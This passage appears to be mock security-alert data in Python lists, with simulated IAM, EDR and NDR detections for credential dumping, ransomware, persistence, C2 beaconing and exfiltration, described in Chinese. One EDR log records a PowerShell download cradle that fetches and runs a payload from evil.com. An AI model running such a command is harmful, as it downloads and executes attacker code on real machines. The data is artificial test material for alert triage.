        "description": "共享账户 'Guest-User' 通常仅在白天使用，但在凌晨 2:00 进行了登录。这表明该共享账户可能被滥用。",
        "artifacts": [
            {"type": "username", "value": "Guest-User"},
            {"type": "source_ip", "value": "192.168.3.88"},
            {"type": "time_of_day", "value": "Unusual-hours"}
        ],
        "raw_log": {
            "service": "Active Directory",
            "timestamp": "2025-09-24T00:00:19.999Z",
            "event_type": "LoginSuccess",
            "user": {"username": "Guest-User"},
            "src_ip": "192.168.3.88"
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-13-Credential-Theft-Attempt-Local-Admin",
        "rule_name": "本地管理员账户凭据盗窃尝试",
        "alert_date": "2025-09-24T00:05:00Z",
        "tags": ["credential-theft", "lateral-movement", "endpoint"],
        "severity": "High",
        "reference": "主机FIN-WKS-JDOE-05上发生本地凭据转储",
        "description": "主机 FIN-WKS-JDOE-05 上检测到 Mimikatz 等凭据转储工具的活动。攻击者可能试图从本地系统窃取管理员或域账户凭据。",
        "artifacts": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "tool_name", "value": "Mimikatz"}
        ],
        "raw_log": {
            "service": "EDR",
            "timestamp": "2025-09-24T00:04:59.876Z",
            "event_type": "ProcessActivity",
            "src_ip": "192.168.1.101",
            "process_name": "cmd.exe",
            "command_line": "powershell.exe -e JABNAGkAbQBpAGsAYQB0AHoAIAB... "
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-14-Role-Assignment-Anomaly-Cloud",
        "rule_name": "云角色分配异常",
        "alert_date": "2025-09-24T00:10:30Z",
        "tags": ["cloud-security", "iam", "role-anomaly"],
        "severity": "High",
        "reference": "用户c.jones被授予'IAMFullAccess'角色",
        "description": "用户 c.jones 被授予 AWS 'IAMFullAccess' 角色，该角色允许创建和管理所有 IAM 资源。此权限与该用户的开发人员角色不符。",
        "artifacts": [
            {"type": "username", "value": "c.jones"},
            {"type": "role_granted", "value": "IAMFullAccess"},
            {"type": "platform", "value": "AWS"}
        ],
        "raw_log": {
            "service": "AWS CloudTrail",
            "timestamp": "2025-09-24T00:10:29.999Z",
            "event_name": "AttachUserPolicy",
            "user_identity": {"type": "AssumedRole", "principal_id": "AdminRole"},
            "details": {"user_id": "c.jones", "policy_name": "IAMFullAccess"}
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-15-Account-Lockout-Threshold-Exceeded",
        "rule_name": "账户锁定阈值超出",
        "alert_date": "2025-09-24T00:15:15Z",
        "tags": ["authentication", "account-lockout", "brute-force"],
        "severity": "Medium",
        "reference": "账户j.doe因高频失败登录被锁定",
        "description": "用户 j.doe 的账户因在 5 分钟内多次失败登录而达到锁定阈值。这可能是针对该账户的直接暴力破解攻击。",
        "artifacts": [
            {"type": "username", "value": "j.doe"},
            {"type": "failed_logins", "value": 6},
            {"type": "lockout_time", "value": "2025-09-24T00:15:15Z"}
        ],
        "raw_log": {
            "service": "Active Directory",
            "timestamp": "2025-09-24T00:15:14.543Z",
            "event_type": "AccountLockout",
            "user": {"username": "j.doe"},
            "src_ip": "192.168.1.101",
            "details": {"lockout_threshold": 5, "current_failures": 6}
        }
    }
]
edr_alerts_1 = [
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-01-Suspicious-PowerShell-Execution",
        "rule_name": "可疑的PowerShell命令执行",
        "alert_date": "2025-09-23T20:30:15Z",
        "tags": ["powershell", "code-execution", "fileless"],
        "severity": "High",
        "reference": "主机WKS-HR-03上执行了编码的PowerShell命令",
        "description": "主机 WKS-HR-03 上检测到一条经过 Base64 编码的 PowerShell 命令。这种技术常用于规避签名检测，可能用于下载或执行恶意脚本。",
        "artifacts": [
            {"type": "hostname", "value": "WKS-HR-03"},
            {"type": "process_name", "value": "powershell.exe"},
            {"type": "command_line", "value": "powershell.exe -enc JABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABzAGUAbgBpAHQ..."}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-hr-03",
            "timestamp": "2025-09-23T20:30:14.999Z",
            "event_type": "ProcessCreation",
            "process_info": {"pid": 1234, "parent_pid": 5678, "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                             "command_line": "powershell.exe -enc JABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABzAGUAbgBpAHQ..."},
            "user_info": {"username": "j.smith", "domain": "MYCORP"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-02-Unusual-Network-Connection-to-External",
        "rule_name": "异常外部网络连接",
        "alert_date": "2025-09-23T20:35:40Z",
        "tags": ["network-connection", "c2", "data-exfiltration"],
        "severity": "High",
        "reference": "主机FIN-WKS-JDOE-05连接到异常外部IP",
        "description": "主机 FIN-WKS-JDOE-05 发起了一个到外部 IP 地址 185.22.67.123 的网络连接。该 IP 不在公司白名单内，且已被威胁情报标记为恶意IP。",
        "artifacts": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_ip", "value": "185.22.67.123"},
            {"type": "port", "value": 4444}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-fin-05",
            "timestamp": "2025-09-23T20:35:39.876Z",
            "event_type": "NetworkConnection",
            "process_info": {"pid": 987, "path": "C:\\ProgramData\\updater.exe"},
            "network_info": {"protocol": "TCP", "dest_ip": "185.22.67.123", "dest_port": 4444, "action": "allow"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-03-Credential-Dumping-Attempt",
        "rule_name": "凭据转储尝试",
        "alert_date": "2025-09-23T20:40:20Z",
        "tags": ["credential-theft", "mimikatz", "privilege-escalation"],
        "severity": "Critical",
        "reference": "主机WKS-HR-03上检测到lsass.exe进程访问",
        "description": "一个非系统进程尝试访问 Windows 本地安全认证子系统服务 (LSASS.exe) 的内存空间。此行为是凭据转储工具（如 Mimikatz）的典型特征。",
        "artifacts": [
            {"type": "hostname", "value": "WKS-HR-03"},
            {"type": "target_process", "value": "lsass.exe"},
            {"type": "source_process", "value": "C:\\Program Files\\Tools\\dumper.exe"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-hr-03",
            "timestamp": "2025-09-23T20:40:19.444Z",
            "event_type": "ProcessAccess",
            "source_process": {"pid": 4321, "path": "C:\\Program Files\\Tools\\dumper.exe"},
            "target_process": {"pid": 555, "path": "C:\\Windows\\System32\\lsass.exe"},
            "access_rights": "PROCESS_QUERY_INFORMATION, PROCESS_VM_READ"
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-04-Ransomware-File-Activity",
        "rule_name": "勒索软件文件活动",
        "alert_date": "2025-09-23T20:45:00Z",
        "tags": ["ransomware", "file-encryption", "mass-rename"],
        "severity": "Critical",
        "reference": "主机WKS-HR-03上发生大规模文件重命名",
        "description": "主机 WKS-HR-03 在短时间内对大量文件进行快速重命名，并附加了 '.encrypted' 扩展名。这是典型的勒索软件加密行为。",
        "artifacts": [
            {"type": "hostname", "value": "WKS-HR-03"},
            {"type": "process_name", "value": "malware.exe"},
            {"type": "file_operations", "value": "250 file renames in 30 seconds"},
            {"type": "file_extension", "value": ".encrypted"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-hr-03",
            "timestamp": "2025-09-23T20:44:59.123Z",
            "event_type": "FileActivity",
            "process_info": {"pid": 7777, "path": "C:\\temp\\malware.exe"},
            "file_details": {"type": "rename", "count": 250, "new_extension": ".encrypted"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-05-Suspicious-DLL-Load",
        "rule_name": "可疑的DLL加载",
        "alert_date": "2025-09-23T20:50:30Z",
        "tags": ["dll-hijacking", "persistence", "code-execution"],
        "severity": "Medium",
        "reference": "主机SRV-PROD-01上加载了非标准路径的DLL",
        "description": "主机 SRV-PROD-01 上的一个合法进程（services.exe）加载了一个来自非标准或可疑路径（C:\\Temp）的 DLL 文件。这可能是 DLL 劫持攻击的迹象。",
        "artifacts": [
            {"type": "hostname", "value": "SRV-PROD-01"},
            {"type": "parent_process", "value": "services.exe"},
            {"type": "loaded_dll", "value": "C:\\Temp\\malicious.dll"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-prod-01",
            "timestamp": "2025-09-23T20:50:29.987Z",
            "event_type": "DllLoad",
            "process_info": {"pid": 111, "path": "C:\\Windows\\System32\\services.exe"},
            "dll_info": {"path": "C:\\Temp\\malicious.dll", "hash": "abc123def456"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-06-Reconnaissance-Tool-Execution",
        "rule_name": "侦察工具执行",
        "alert_date": "2025-09-23T20:55:10Z",
        "tags": ["reconnaissance", "scanning", "discovery"],
        "severity": "Low",
        "reference": "主机FIN-WKS-JDOE-05上执行了IP扫描命令",
        "description": "主机 FIN-WKS-JDOE-05 上的命令行中出现了 IP 扫描相关的参数，这表明可能正在进行内部网络侦察。",
        "artifacts": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "process_name", "value": "ping.exe"},
            {"type": "command_line", "value": "ping -n 1 192.168.1.1-254"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-fin-05",
            "timestamp": "2025-09-23T20:55:09.111Z",
            "event_type": "ProcessCreation",
            "process_info": {"pid": 2222, "path": "C:\\Windows\\System32\\ping.exe", "command_line": "ping -n 1 192.168.1.1-254"},
            "user_info": {"username": "j.doe", "domain": "MYCORP"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-07-Unusual-Parent-Child-Process",
        "rule_name": "异常的父子进程关系",
        "alert_date": "2025-09-23T21:00:30Z",
        "tags": ["process-anomaly", "code-execution", "fileless"],
        "severity": "High",
        "reference": "Word进程启动了cmd.exe",
        "description": "Microsoft Word (winword.exe) 进程创建了一个命令提示符 (cmd.exe) 进程。此行为极不寻常，通常是恶意文档或宏病毒的感染标志。",
        "artifacts": [
            {"type": "hostname", "value": "WKS-HR-03"},
            {"type": "parent_process", "value": "winword.exe"},
            {"type": "child_process", "value": "cmd.exe"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-hr-03",
            "timestamp": "2025-09-23T21:00:29.876Z",
            "event_type": "ProcessCreation",
            "process_info": {"pid": 3333, "parent_pid": 4444, "parent_path": "C:\\Program Files\\Microsoft Office\\WINWORD.exe",
                             "path": "C:\\Windows\\System32\\cmd.exe"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-08-New-User-Added-to-Admin-Group",
        "rule_name": "新用户加入管理员组",
        "alert_date": "2025-09-23T21:05:00Z",
        "tags": ["privilege-escalation", "account-management"],
        "severity": "High",
        "reference": "主机IT-ADMIN-01上添加新管理员用户",
        "description": "主机 IT-ADMIN-01 上的账户 'j.doe' 将一个新用户 'temp_admin' 添加到了本地 'Administrators' 组。",
        "artifacts": [
            {"type": "hostname", "value": "IT-ADMIN-01"},
            {"type": "actor_account", "value": "j.doe"},
            {"type": "new_account", "value": "temp_admin"},
            {"type": "group_name", "value": "Administrators"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-it-01",
            "timestamp": "2025-09-23T21:04:59.000Z",
            "event_type": "LocalGroupChange",
            "user_info": {"username": "j.doe"},
            "group_info": {"group_name": "Administrators", "action": "add_user", "target_user": "temp_admin"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-09-Suspicious-Service-Creation",
        "rule_name": "可疑服务创建",
        "alert_date": "2025-09-23T21:10:20Z",
        "tags": ["persistence", "service-creation", "malware"],
        "severity": "Medium",
        "reference": "主机SRV-PROD-01上创建了可疑服务",
        "description": "主机 SRV-PROD-01 上创建了一个名为 'MaliciousService' 的新 Windows 服务，其可执行文件路径指向一个非标准位置。",
        "artifacts": [
            {"type": "hostname", "value": "SRV-PROD-01"},
            {"type": "service_name", "value": "MaliciousService"},
            {"type": "service_path", "value": "C:\\Users\\Public\\malware.exe"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-prod-01",
            "timestamp": "2025-09-23T21:10:19.456Z",
            "event_type": "ServiceCreation",
            "process_info": {"pid": 5555, "path": "C:\\Windows\\System32\\sc.exe"},
            "service_info": {"name": "MaliciousService", "path": "C:\\Users\\Public\\malware.exe", "start_type": "auto"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-10-Mass-File-Deletion",
        "rule_name": "大规模文件删除",
        "alert_date": "2025-09-23T21:15:50Z",
        "tags": ["data-destruction", "denial-of-service"],
        "severity": "High",
        "reference": "主机FIN-WKS-JDOE-05上发生大规模文件删除",
        "description": "主机 FIN-WKS-JDOE-05 上的一个进程在短时间内删除了大量文件，这可能表明数据销毁或勒索软件活动。",
        "artifacts": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "process_name", "value": "eraser.exe"},
            {"type": "file_operations", "value": "500 file deletions in 1 minute"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-fin-05",
            "timestamp": "2025-09-23T21:15:49.123Z",
            "event_type": "FileActivity",
            "process_info": {"pid": 6666, "path": "C:\\temp\\eraser.exe"},
            "file_details": {"type": "delete", "count": 500, "reason": "Unusual bulk deletion"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-11-Registry-Run-Key-Modification",
        "rule_name": "注册表启动项修改",
        "alert_date": "2025-09-23T21:20:10Z",
        "tags": ["persistence", "registry"],
        "severity": "High",
        "reference": "主机IT-ADMIN-01上修改了Run注册表键",
        "description": "主机 IT-ADMIN-01 上的一个进程向 HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 注册表键添加了一个新的值。这是实现持久化的常见技术。",
        "artifacts": [
            {"type": "hostname", "value": "IT-ADMIN-01"},
            {"type": "registry_key", "value": "HKLM\\...\\Run"},
            {"type": "registry_value", "value": "C:\\ProgramData\\backdoor.exe"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-it-01",
            "timestamp": "2025-09-23T21:20:09.543Z",
            "event_type": "RegistryModification",
            "process_info": {"pid": 7890, "path": "C:\\temp\\tool.exe"},
            "registry_info": {"key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "value": "C:\\ProgramData\\backdoor.exe", "action": "create"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-12-Suspicious-Process-Injection",
        "rule_name": "可疑进程注入",
        "alert_date": "2025-09-23T21:25:00Z",
        "tags": ["process-injection", "code-execution", "evasion"],
        "severity": "Critical",
        "reference": "主机SRV-PROD-01上的恶意注入活动",
        "description": "主机 SRV-PROD-01 上，一个可疑进程尝试将代码注入到另一个合法的进程（如 svchost.exe）中。此技术常用于躲避检测。",
        "artifacts": [
            {"type": "hostname", "value": "SRV-PROD-01"},
            {"type": "target_process", "value": "svchost.exe"},
            {"type": "source_process", "value": "C:\\Users\\Public\\malware.exe"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-prod-01",
            "timestamp": "2025-09-23T21:24:59.000Z",
            "event_type": "ProcessInjection",
            "source_process": {"pid": 8888, "path": "C:\\Users\\Public\\malware.exe"},
            "target_process": {"pid": 999, "path": "C:\\Windows\\System32\\svchost.exe"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-13-Unusual-Application-Start-Time",
        "rule_name": "异常的应用启动时间",
        "alert_date": "2025-09-24T02:10:00Z",
        "tags": ["behavioral-anomaly", "after-hours", "compromised-account"],
        "severity": "Medium",
        "reference": "用户a.smith在非工作时间启动财务应用",
        "description": "用户 a.smith 的账户在凌晨 2 点（非正常工作时间）启动了财务应用程序。此行为与该用户的日常行为模式不符。",
        "artifacts": [
            {"type": "username", "value": "a.smith"},
            {"type": "hostname", "value": "MKT-WKS-ASMITH-01"},
            {"type": "process_name", "value": "FinanceApp.exe"},
            {"type": "time_of_day", "value": "02:10 AM"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-mkt-01",
            "timestamp": "2025-09-24T02:10:00.000Z",
            "event_type": "ProcessCreation",
            "process_info": {"pid": 1122, "path": "C:\\Program Files\\Finance\\FinanceApp.exe"},
            "user_info": {"username": "a.smith"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-14-Mass-File-Access-to-Shares",
        "rule_name": "批量访问网络共享文件",
        "alert_date": "2025-09-23T21:30:15Z",
        "tags": ["reconnaissance", "lateral-movement", "data-exfiltration"],
        "severity": "High",
        "reference": "主机IT-ADMIN-01批量访问网络共享",
        "description": "主机 IT-ADMIN-01 上的一个进程在短时间内对多个网络共享文件夹进行了批量访问。这通常是攻击者在进行内部网络侦察。",
        "artifacts": [
            {"type": "hostname", "value": "IT-ADMIN-01"},
            {"type": "process_name", "value": "cmd.exe"},
            {"type": "accessed_shares", "value": ["\\fileshare\\HR", "\\fileshare\\Finance", "\\fileshare\\Eng"]}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-it-01",
            "timestamp": "2025-09-23T21:30:14.999Z",
            "event_type": "FileAccess",
            "process_info": {"pid": 4567, "path": "C:\\Windows\\System32\\cmd.exe", "command_line": "dir \\fileshare\\*"},
            "access_info": {"access_count": 50, "access_type": "read"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-15-Web-Browser-Access-Local-Files",
        "rule_name": "浏览器进程访问本地敏感文件",
        "alert_date": "2025-09-23T21:35:40Z",
        "tags": ["web-browser", "local-file-access", "data-exfiltration"],
        "severity": "Medium",
        "reference": "Chrome浏览器进程访问敏感本地文件",
        "description": "Chrome 浏览器进程尝试读取一个通常不应被浏览器访问的敏感本地文件，例如密码或 SSH 密钥文件。这可能是恶意扩展或脚本的迹象。",
        "artifacts": [
            {"type": "hostname", "value": "WKS-HR-03"},
            {"type": "process_name", "value": "chrome.exe"},
            {"type": "file_path", "value": "C:\\Users\\j.smith\\.ssh\\id_rsa"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-hr-03",
            "timestamp": "2025-09-23T21:35:39.876Z",
            "event_type": "FileRead",
            "process_info": {"pid": 1122, "path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"},
            "file_info": {"path": "C:\\Users\\j.smith\\.ssh\\id_rsa"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-16-Scheduled-Task-Creation",
        "rule_name": "可疑的计划任务创建",
        "alert_date": "2025-09-23T21:40:20Z",
        "tags": ["persistence", "scheduled-task"],
        "severity": "High",
        "reference": "主机SRV-PROD-01上创建可疑计划任务",
        "description": "主机 SRV-PROD-01 上创建了一个新的计划任务，该任务旨在在每天凌晨 3 点执行一个可疑的可执行文件。这是一种常见的持久化机制。",
        "artifacts": [
            {"type": "hostname", "value": "SRV-PROD-01"},
            {"type": "task_name", "value": "MaliciousUpdater"},
            {"type": "task_command", "value": "C:\\ProgramData\\backdoor.exe"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-prod-01",
            "timestamp": "2025-09-23T21:40:19.444Z",
            "event_type": "ScheduledTaskCreation",
            "process_info": {"pid": 888, "path": "C:\\Windows\\System32\\schtasks.exe"},
            "task_details": {"name": "MaliciousUpdater", "command": "C:\\ProgramData\\backdoor.exe", "schedule": "daily at 03:00 AM"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-17-Privilege-Escalation-Exploit-Attempt",
        "rule_name": "提权漏洞利用尝试",
        "alert_date": "2025-09-23T21:45:00Z",
        "tags": ["privilege-escalation", "vulnerability-exploit"],
        "severity": "Critical",
        "reference": "主机FIN-WKS-JDOE-05上检测到提权尝试",
        "description": "主机 FIN-WKS-JDOE-05 上的一个低权限进程尝试通过已知的 Windows 提权漏洞模式来提升其权限。此行为与 CVE-2020-0796 的利用方式相似。",
        "artifacts": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "vulnerability", "value": "CVE-2020-0796 (SMBGhost)"},
            {"type": "process_name", "value": "exploit.exe"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-fin-05",
            "timestamp": "2025-09-23T21:44:59.123Z",
            "event_type": "PrivilegeEscalationAttempt",
            "process_info": {"pid": 9999, "path": "C:\\temp\\exploit.exe"},
            "exploit_details": {"technique": "SMBGhost", "target_system": "kernel"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-18-Local-Credential-Theft-LSASS-Memory-Access",
        "rule_name": "本地凭据盗窃（LSASS内存访问）",
        "alert_date": "2025-09-23T21:50:30Z",
        "tags": ["credential-theft", "lsass", "lateral-movement"],
        "severity": "Critical",
        "reference": "主机SRV-PROD-01上对lsass.exe的远程访问",
        "description": "主机 SRV-PROD-01 上的一个进程从网络上的另一个主机（192.168.1.55）尝试远程访问 lsass.exe 的内存。这表明攻击者正在使用窃取的凭据进行横向移动。",
        "artifacts": [
            {"type": "hostname", "value": "SRV-PROD-01"},
            {"type": "target_process", "value": "lsass.exe"},
            {"type": "source_ip", "value": "192.168.1.55"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-prod-01",
            "timestamp": "2025-09-23T21:50:29.987Z",
            "event_type": "RemoteProcessAccess",
            "source_info": {"ip": "192.168.1.55"},
            "target_process": {"pid": 555, "path": "C:\\Windows\\System32\\lsass.exe"},
            "access_rights": "PROCESS_VM_READ"
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-19-Suspicious-Script-Execution",
        "rule_name": "可疑脚本执行",
        "alert_date": "2025-09-23T21:55:10Z",
        "tags": ["scripting", "macro", "download-cradle"],
        "severity": "High",
        "reference": "主机MKT-WKS-ASMITH-01上执行下载脚本",
        "description": "主机 MKT-WKS-ASMITH-01 上的 WScript.exe 进程执行了一个包含远程下载命令（'IEX'）的 VBScript 脚本。",
        "artifacts": [
            {"type": "hostname", "value": "MKT-WKS-ASMITH-01"},
            {"type": "process_name", "value": "wscript.exe"},
            {"type": "script_command", "value": "wscript.exe script.vbs"},
            {"type": "download_cradle", "value": "IEX(New-Object Net.WebClient)..."}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-mkt-01",
            "timestamp": "2025-09-23T21:55:09.111Z",
            "event_type": "ProcessCreation",
            "process_info": {"pid": 1234, "path": "C:\\Windows\\System32\\wscript.exe", "command_line": "wscript.exe c:\\temp\\script.vbs"},
            "script_content_snippet": "Set objShell = CreateObject(\"WScript.Shell\"): objShell.Run \"powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\""
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-20-Unusual-Parent-Child-Process-Web-Server",
        "rule_name": "Web服务器进程异常子进程",
        "alert_date": "2025-09-23T22:00:00Z",
        "tags": ["web-server", "process-anomaly", "vulnerability"],
        "severity": "Critical",
        "reference": "IIS进程启动了cmd.exe",
        "description": "Web 服务器（SRV-WEB-02）上的 IIS 工作进程 (w3wp.exe) 创建了一个命令提示符 (cmd.exe) 进程。此行为通常是 Web 漏洞被利用（如 Web Shell 或远程命令执行）的标志。",
        "artifacts": [
            {"type": "hostname", "value": "SRV-WEB-02"},
            {"type": "parent_process", "value": "w3wp.exe"},
            {"type": "child_process", "value": "cmd.exe"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-web-02",
            "timestamp": "2025-09-23T21:59:59.000Z",
            "event_type": "ProcessCreation",
            "process_info": {"pid": 5678, "parent_pid": 1234, "parent_path": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
                             "path": "C:\\Windows\\System32\\cmd.exe"}
        }
    }
]
ndr_alert_1 = [
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-01-C2-Beaconing",
        "rule_name": "C2 信标（Beaconing）流量",
        "alert_date": "2025-09-24T09:05:00Z",
        "tags": ["c2", "malware", "beaconing", "outbound"],
        "severity": "Critical",
        "reference": "主机192.168.1.101与外部C2服务器进行周期性通信",
        "description": "主机 192.168.1.101 发起与外部 IP 地址 104.22.56.78 的周期性小数据包通信。此行为与命令与控制（C2）信标模式高度吻合。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_ip", "value": "104.22.56.78"},
            {"type": "protocol", "value": "HTTPS"},
            {"type": "frequency", "value": "every 60 seconds"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-01",
            "timestamp": "2025-09-24T09:04:59.876Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.1.101",
            "dst_ip": "104.22.56.78",
            "dst_port": 443,
            "flow_id": "f12345",
            "packet_count": 5,
            "data_size_bytes": 250,
            "observed_behavior": "Periodic, low-volume communication"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-02-Internal-Port-Scan",
        "rule_name": "内部端口扫描",
        "alert_date": "2025-09-24T09:10:30Z",
        "tags": ["reconnaissance", "lateral-movement", "port-scan"],
        "severity": "High",
        "reference": "主机192.168.2.50对多个内部主机进行扫描",
        "description": "主机 192.168.2.50 在短时间内尝试连接同一网段内的多个 IP 地址和端口，这是一种典型的内部网络侦察行为。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.2.50"},
            {"type": "target_subnet", "value": "192.168.2.0/24"},
            {"type": "scan_type", "value": "TCP SYN Scan"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-02",
            "timestamp": "2025-09-24T09:10:29.987Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.2.50",
            "dst_ips": ["192.168.2.51", "192.168.2.52", "192.168.2.53", "..."],
            "dst_ports": [22, 80, 443, 3389, "..."],
            "count": 250
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-03-DNS-Tunneling",
        "rule_name": "DNS 隧道通信",
        "alert_date": "2025-09-24T09:15:20Z",
        "tags": ["dns-tunneling", "exfiltration", "malware"],
        "severity": "Critical",
        "reference": "主机192.168.3.88发起大量异常DNS查询",
        "description": "主机 192.168.3.88 发起大量包含长且无意义子域名的 DNS 查询。这是一种利用 DNS 协议进行数据外泄或C2通信的常见技术。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.3.88"},
            {"type": "query_domain", "value": "a1b2c3d4e5f6.malicious-domain.com"},
            {"type": "query_volume", "value": "100+ queries/min"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-03",
            "timestamp": "2025-09-24T09:15:19.444Z",
            "event_type": "DNSQuery",
            "src_ip": "192.168.3.88",
            "query": "a1b2c3d4e5f6g7h8.malicious-domain.com",
            "query_type": "A"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-04-Lateral-Movement-SMB-Anomaly",
        "rule_name": "SMB 异常横向移动",
        "alert_date": "2025-09-24T09:20:00Z",
        "tags": ["lateral-movement", "smb", "insider-threat"],
        "severity": "High",
        "reference": "主机192.168.1.101对敏感服务器进行SMB连接",
        "description": "主机 192.168.1.101（一名普通员工的工作站）与 HR 和财务部门的服务器进行了非计划的 SMB 连接，此行为与该主机的历史流量模式不符。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_ip", "value": "192.168.10.20"},
            {"type": "protocol", "value": "SMB (445)"},
            {"type": "destination_server", "value": "SRV-HR-FILES"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-01",
            "timestamp": "2025-09-24T09:19:59.123Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.1.101",
            "dst_ip": "192.168.10.20",
            "dst_port": 445,
            "user": "j.doe",
            "behavioral_score": 9.5
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-05-Exfiltration-Spike",
        "rule_name": "数据外泄流量激增",
        "alert_date": "2025-09-24T09:25:40Z",
        "tags": ["data-exfiltration", "upload", "anomaly"],
        "severity": "High",
        "reference": "主机192.168.4.12向外部服务器上传大量数据",
        "description": "主机 192.168.4.12 在 5 分钟内向一个外部 IP 地址上传了异常大批量的 HTTPS 加密数据，这与该主机的历史数据上传量严重不符。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.4.12"},
            {"type": "destination_ip", "value": "52.8.10.20"},
            {"type": "protocol", "value": "HTTPS"},
            {"type": "data_volume_mb", "value": 500}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-04",
            "timestamp": "2025-09-24T09:25:39.999Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.4.12",
            "dst_ip": "52.8.10.20",
            "dst_port": 443,
            "upload_bytes": 524288000
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-06-Suspicious-RDP-Activity",
        "rule_name": "可疑的RDP活动",
        "alert_date": "2025-09-24T09:30:10Z",
        "tags": ["lateral-movement", "rdp", "remote-access"],
        "severity": "Medium",
        "reference": "非管理员主机进行RDP连接",
        "description": "一台通常不用于远程管理的普通工作站（192.168.2.50）与多台服务器建立了 RDP 连接。这可能表明攻击者正在使用 RDP 进行横向移动。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.2.50"},
            {"type": "destination_ip", "value": "192.168.10.30"},
            {"type": "protocol", "value": "RDP (3389)"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-02",
            "timestamp": "2025-09-24T09:30:09.543Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.2.50",
            "dst_ip": "192.168.10.30",
            "dst_port": 3389,
            "protocol": "RDP"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-07-Internal-HTTP-to-Bad-Reputation-IP",
        "rule_name": "内部HTTP连接到低信誉IP",
        "alert_date": "2025-09-24T09:35:55Z",
        "tags": ["reputation", "malicious-ip", "botnet"],
        "severity": "High",
        "reference": "主机192.168.1.101连接到低信誉IP",
        "description": "主机 192.168.1.101 正在通过 HTTP 协议（非加密）与一个已知信誉低下的 IP 地址 198.51.100.25 进行通信，可能存在恶意软件感染。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_ip", "value": "198.51.100.25"},
